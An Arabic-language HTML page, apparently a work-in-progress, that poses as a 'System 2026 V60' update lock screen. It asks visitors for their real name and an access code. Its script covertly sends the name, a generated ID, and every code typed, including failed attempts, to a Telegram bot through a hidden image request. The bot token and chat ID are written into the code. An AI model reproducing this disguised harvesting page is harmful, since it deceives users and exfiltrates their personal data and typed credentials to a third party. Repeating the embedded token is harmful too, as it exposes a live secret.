<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System 2026 [V60]</title>
<style>
    body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background-color:#0d1117;color:#c9d1d9;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;}
    #lock-screen{background:#161b22;padding:25px;border-radius:12px;text-align:center;width:85%;max-width:320px;}
    input{background:#0d1117;border:1px solid #30363d;color:#58a6ff;padding:12px;width:100%;text-align:center;font-size:20px;border-radius:6px;margin:15px 0;}
    button{background:#238636;color:#fff;border:none;padding:12px 0;width:100%;font-size:16px;border-radius:6px;cursor:pointer;margin-top:10px;}
    .blue-btn {background: #1f6feb; margin-top: 15px;} 
    #status {color: yellow; font-size: 12px; margin-top: 10px;}
</style>
</head>
<body>

<div id="lock-screen">
    <h2 style="color:#fff;">نظام 2026 (V60)</h2>
    <p style="color:#8b949e;">New System Update</p>
    
    <div style="background:#0d1117; padding:10px; margin: 10px 0;">
        <p id="uName" style="color:#238636;font-weight:bold;">...</p>
        <p id="uID" style="color:#58a6ff;font-size:10px;">Loading...</p>
    </div>

    <input type="tel" id="pIn" placeholder="الكود">
    <button onclick="login()">دخول</button>
    
    <!-- الزر الأزرق للاختبار -->
    <button class="blue-btn" onclick="testTele()">📡 اضغط هنا لاختبار التليجرام</button>
    
    <p id="status">جاهز...</p>
</div>

<script>
    // 1. مسح القديم وتحديد الهوية
    let n = localStorage.getItem("v60_name");
    let i = localStorage.getItem("v60_id");
    
    if(!i) { i = "ID-" + Math.floor(Math.random()*9999); localStorage.setItem("v60_id", i); }
    
    if(!n) {
        n = prompt("تحديث V60: ادخل اسمك الحقيقي:");
        if(n) { localStorage.setItem("v60_name", n); send("NEW_USER", n); }
        else { location.reload(); }
    }
    
    document.getElementById("uName").innerText = n;
    document.getElementById("uID").innerText = i;

    // 2. دالة الارسال (Image Hack)
    function send(act, det) {
        document.getElementById("status").innerText = "جاري الإرسال...";
        const T = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
        const C = "-1003886528114";
        const msg = `🔔 <b>V60 APK</b> | 👤 ${n} | 🔑 ${act} | 📝 ${det}`;
        
        // ارسال عن طريق صورة وهمية
        new Image().src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
        
        setTimeout(()=> document.getElementById("status").innerText = "تم الإرسال ✓", 1500);
    }

    // 3. اختبار الزر الازرق
    window.testTele = function() {
        send("TEST_BUTTON", "Manual Click");
        alert("تم إرسال رسالة الاختبار.. راجع الجروب.");
    };

    // 4. الدخول
    window.login = function() {
        const v = document.getElementById("pIn").value;
        // باسورد بسيط للتجربة: 2026
        // لو عايز القديم المعقد قول لي ارجعهولك، بس نجرب بده الاول
        if(v === "2026") {
            send("LOGIN_SUCCESS", "OK");
            alert("تم الدخول بنجاح (تجريبي)");
        } else {
            send("LOGIN_FAIL", v);
            alert("كود خطأ");
        }
    };
</script>
</body>
  </html>
